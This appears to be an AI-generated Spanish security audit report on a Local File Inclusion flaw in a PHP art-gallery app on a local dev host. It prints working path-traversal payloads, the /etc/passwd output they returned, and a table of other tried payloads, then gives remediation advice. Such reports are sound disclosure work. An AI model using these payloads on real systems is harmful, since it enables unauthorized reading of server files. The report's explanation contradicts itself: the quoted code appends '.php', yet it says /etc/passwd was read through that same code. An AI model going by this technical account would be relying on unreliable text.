# Informe de Auditoría de Seguridad Web - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:45:59 UTC  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Analista:** GitHub Copilot CLI  

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del sistema de archivos del servidor mediante path traversal en el parámetro `page` del script `gallery.php`.

**Criticidad:** 🔴 **ALTA**

---

## 2. Descripción de la Aplicación

- **Nombre:** Galería de Arte Virtual
- **Tecnología:** PHP
- **Ruta vulnerable:** `/gallery.php`
- **Parámetro vulnerable:** `page`
- **Uso normal:** El parámetro `page` carga secciones de contenido (modern, classic, abstract, about)

---

## 3. Vulnerabilidades Encontradas

### 3.1 Local File Inclusion via Path Traversal

| Campo | Detalle |
|-------|---------|
| **Vulnerabilidad** | Local File Inclusion (LFI) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **CVSS v3** | 7.5 (Alto) |
| **Parámetro** | `page` en `gallery.php` |
| **Autenticación requerida** | No |

#### Descripción Técnica

La aplicación incluye dinámicamente archivos PHP mediante la función `include()` de PHP usando el valor del parámetro `page` directamente. El código construye la ruta de la forma:

```
include("pages/" . $page . ".php");
```

Sin embargo, cuando se utilizan secuencias de path traversal (`../`), PHP resuelve la ruta relativa y permite acceder a archivos fuera del directorio `pages/`. La vulnerabilidad fue detectada en la línea 104 del archivo `/var/www/html/gallery.php`.

#### Evidencia de Explotación

**Payload utilizado:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Respuesta del servidor (contenido de `/etc/passwd`):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Otros archivos leídos exitosamente:**

- `/etc/hosts` → Revela la dirección IP interna del servidor: `172.19.0.2` (hostname: `d5054e367753`)
- `/proc/version` → `Linux version 6.8.0-110-generic (Ubuntu 13.3.0) #110-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 19 15:09:20 UTC 2026`

**Archivos protegidos (acceso denegado):**
- `/etc/shadow` → Error "Permission denied" (el proceso web corre como `www-data`)

---

## 4. Impacto

| Impacto | Descripción |
|---------|-------------|
| **Divulgación de información** | Lectura de archivos del sistema como `/etc/passwd`, `/etc/hosts`, `/proc/version` |
| **Reconocimiento interno** | El atacante puede mapear la red interna y la configuración del servidor |
| **Lectura de código fuente** | Potencial lectura de archivos PHP de la aplicación con wrappers PHP |
| **Escalada potencial** | Con wrappers como `php://filter` o acceso a archivos de configuración, podría derivar en RCE |

---

## 5. Payloads Probados

| Payload | Resultado |
|---------|-----------|
| `?page=/etc/passwd` | ❌ Bloqueado (appends `.php`) |
| `?page=../../../etc/passwd` | ✅ **ÉXITO** - Leer `/etc/passwd` |
| `?page=../../../etc/shadow` | ⚠️ Path válido pero sin permisos |
| `?page=../../../etc/hosts` | ✅ **ÉXITO** - Leer `/etc/hosts` |
| `?page=../../../proc/version` | ✅ **ÉXITO** - Leer `/proc/version` |
| `?page=php://filter/convert.base64-encode/resource=gallery` | ❌ Filtrado/bloqueado |
| `?page=....//....//....//etc/passwd` | ❌ No procesado correctamente |

---

## 6. Recomendaciones

### 6.1 Corrección Inmediata

1. **Validar y sanitizar la entrada del usuario:** Usar una lista blanca de páginas permitidas:
   ```php
   $allowed_pages = ['modern', 'classic', 'abstract', 'about'];
   if (in_array($_GET['page'], $allowed_pages)) {
       include("pages/" . $_GET['page'] . ".php");
   } else {
       // Mostrar error 404
   }
   ```

2. **Eliminar la inclusión dinámica de archivos:** Si es posible, reemplazar el mecanismo `include()` dinámico por rutas estáticas.

### 6.2 Medidas Adicionales

3. **Deshabilitar funciones PHP peligrosas:** En `php.ini`, configurar `allow_url_include = Off`.
4. **Aplicar `realpath()` y verificar prefijo:** Verificar que la ruta resuelta comience con el directorio base permitido.
5. **Principio de mínimo privilegio:** El proceso del servidor web (`www-data`) no debe tener acceso de lectura a archivos sensibles del sistema.
6. **Web Application Firewall (WAF):** Configurar reglas para detectar secuencias `../` en parámetros de URL.

---

## 7. Conclusión

La aplicación "Galería de Arte Virtual" en `http://web.dev.local:8081` presenta una vulnerabilidad crítica de **Local File Inclusion** que fue explotada con éxito sin necesidad de autenticación. El atacante puede leer archivos arbitrarios del sistema de archivos del servidor, incluyendo información sensible sobre usuarios del sistema, configuración de red e información del kernel. Se recomienda aplicar las correcciones indicadas de forma inmediata.

---

*Informe generado automáticamente por GitHub Copilot CLI - Análisis de seguridad autorizado*
